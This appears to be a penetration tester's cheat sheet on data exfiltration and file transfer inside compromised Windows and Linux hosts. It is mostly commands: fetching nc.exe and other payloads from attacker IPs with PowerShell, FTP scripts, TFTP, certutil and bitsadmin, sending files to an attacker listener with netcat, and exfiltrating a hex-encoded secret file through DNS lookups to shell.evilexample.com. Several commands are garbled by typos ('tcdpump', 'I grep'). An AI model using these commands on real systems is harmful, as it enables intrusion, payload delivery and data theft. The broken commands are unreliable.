EXFILTR.DATA&LATMOV
Exfiltr.Data&LatMov



## File Transfer
https://bitrot.sh/cheatsheet/01-26-2018-organic-file-transfer/
### Windows
1. Powershell

`powershell -command "wget http://10.10.14.26:8080/nc.exe -OutFile n.exe"`

2. BITSADMIN

/TRANSFER <job name> [type] [/PRIORITY priority] [/ACLFLAGS flags]
		  remote_url local_name
	Transfers one of more files.
	[type] may be /DOWNLOAD or /UPLOAD; default is download
	Multiple URL/file pairs may be specified.
	Unlike most commands, <job name> may only be a name and not a GUID.

3. Powershell script called `post.ps1`

4. Netcat

Server : `nc.exe -w 3 10.10.14.26 1337 < filetosend`
Attacker machine : `nc -lvp 1337 > out.file`

5. smbserver and net use
You can also use the smbserver.py from Impacketâ€™s repo to host a temporary smb server and fetch files in windows from remote smb servers using the net use command.

6. Using Base64 if certutil Installed

 Encode a data file to Base64
`certutil -encode data.txt tmp.b64 && findstr /v /c:- tmp.b64 > data.b64`

 Decode a Base64 file

`certutil -decode data.b64 data.txt`

### Linux
1. File Upload on linux systems via base64 encoding

Converting a file to base64:


1. Using Base64
`cat file2upload | base64`
Once the file is converted to base64, you can just create a new file on the remote system and copy the base64 output of the above file into it. Next step would be to reverse the base64 to binary

`cat fileWithBase64Content | base64 -d > finalBinary`





####WINDOWS file transfers

##File Transfers

limit commands on shell to be non-interactive
https://blog.netspi.com/15-ways-to-download-a-file/

+ TFTP

Windows XP and Win 2003 contain tftp client. Windows 7 do not by default
tfpt clients are usually non-interactive, so they could work through an obtained shell
atftpd --daemon --port 69 /tftp
Windows> tftp -i 192.168.30.45 GET nc.exe

+ FTP
Windows contain FTP client but they are usually interactive
Solution: scripted parameters in ftp client: ftp -s
ftp-commands
echo open 192.168.30.5 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt


+ Powershell

echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.102/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
Webdav
On kali linux install wsgidav and cheroot
pip install wsgidav cheroot
Start the wsgidav on a restricted folder:
mkdir /tmp/webdav_folder
wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav_folder
On Windows mount this folder using net use:
net use * http://YOUR_IP_ADDRESS/
Reference: https://github.com/mar10/wsgidav

+ BitsAdmin
bitsadmin /transfer n http://domain/file c:%homepath%file
debug.exe
+ First use upx or similar to compress the executable:
upx -9 nc.exe
Then use exe2bat to convert the executable into a series of echo commands that are meant to be copied pasted in the remote system:
wine exe2bat.exe nc.exe nc.txt
Then copy paste each command from nc.txt in the remote system. The commands will gradually rebuild the executable in the target machine.
+ certuril
certutil.exe -URL

will fetch ANY file and download it here:
C:\Users\subTee\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
Resources



DNS
On victim:
1.
Hex encode the file to be transferred
xxd -p secret file.hex
2.
Read in each line and do a DNS lookup
for b in 'cat fole.hex '; do dig $b.shell.evilexample.com; done

On attacker:
1.
Capture DNS exfiltrated packets
tcdpump -w /tmp/dns -sO port 53 and host system.example.com
2.
Cut the exfiltrateded hex from the DNS packet
tcpdump -r dnsdemo -n I grep shell.evilexample.com I cut -f9 -d ' '  | cut -fl -d'.' I uniq received. txt
3.
Reverse the hex encoding
xxd -r -p received.txt keys.pgp


